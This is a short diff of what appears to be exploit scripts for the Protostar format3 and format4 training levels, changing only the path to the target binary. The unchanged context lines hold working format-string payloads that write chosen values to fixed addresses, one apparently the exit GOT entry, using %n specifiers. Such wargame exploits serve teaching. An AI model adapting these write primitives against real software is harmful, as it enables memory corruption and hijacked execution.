@@ -264,7 +264,7 @@ def main():
     for nums in range(4):
         target.append(struct.pack('<I', 0x080496F4+nums))
     payload = b''.join(target) + b'%52c' + b'%12$n' + b'%17c' + b'%13$n' + b'%173c' + b'%14$n' + b'%255c' + b'%15$n'
-    exp_file = process('/home/who/Desktop/protostar/format3')
+    exp_file = process('./format3')
     exp_file.sendline(payload)
     exp_file.interactive()
 
@@ -305,7 +305,7 @@ def main():
     for nums in range(4):
         exit_got_addr.append(struct.pack('<I', 0x08049724+nums))
     payload = b''.join(exit_got_addr) + b'%164c' + b'%4$n' + b'%208c' + b'%5$n' + b'%128c' + b'%6$n' + b'%4c' + b'%7$n'
-    exp_file = process('/home/who/Desktop/protostar/format4')
+    exp_file = process('./format4')
     exp_file.sendline(payload)
     exp_file.interactive()
 
